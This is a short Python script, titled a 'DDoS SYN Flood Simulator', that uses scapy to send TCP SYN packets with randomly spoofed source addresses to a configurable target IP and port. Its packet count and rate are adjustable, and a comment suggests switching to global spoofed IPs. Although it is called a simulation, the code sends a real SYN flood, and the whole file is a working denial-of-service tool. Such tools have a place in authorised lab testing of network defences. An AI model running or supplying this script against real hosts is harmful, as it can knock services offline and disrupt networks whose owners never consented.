#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import IP, TCP
import random
import time
import argparse
import os
from tqdm import tqdm

# Check for root privileges
if os.geteuid() != 0:
    print("[-] Error: This script requires root privileges. Run with sudo.")
    exit(1)

# Configuration
parser = argparse.ArgumentParser(description="DDoS SYN Flood Simulator")
parser.add_argument("--target", default="192.168.1.100", help="Target IP address")
parser.add_argument("--port", type=int, default=80, help="Target port")
parser.add_argument("--count", type=int, default=150, help="Number of packets to send")
parser.add_argument("--rate", type=float, default=0.01, help="Delay between packets in seconds")
parser.add_argument("--iface", default=None, help="Network interface to use (e.g., eth0)")
args = parser.parse_args()

target_ip = args.target
target_port = args.port
packet_count = args.count
delay = args.rate
iface = args.iface

# Warn for high load
if packet_count > 1000 or delay < 0.001:
    print("[!] Warning: High packet count or rate may overload the network. Proceed with caution.")

print(f"[*] 🔥 Simulating DDoS Attack (SYN Flood) on {target_ip}:{target_port}...")

def random_ip():
    return f"192.168.1.{random.randint(1,200)}"  # Modify for global IPs if needed

try:
    for _ in tqdm(range(packet_count), desc="Sending packets"):
        ip = IP(src=random_ip(), dst=target_ip)
        tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(ip/tcp, iface=iface, verbose=0)
        time.sleep(delay)
    print(f"[+] DDoS Simulation Complete! {packet_count} packets sent.")
except Exception as e:
    if "Permission denied" in str(e):
        print("[-] Error: Run this script with root privileges (sudo).")
    elif "Network is unreachable" in str(e):
        print("[-] Error: Target network is unreachable.")
    else:
        print(f"[-] Error: {e}")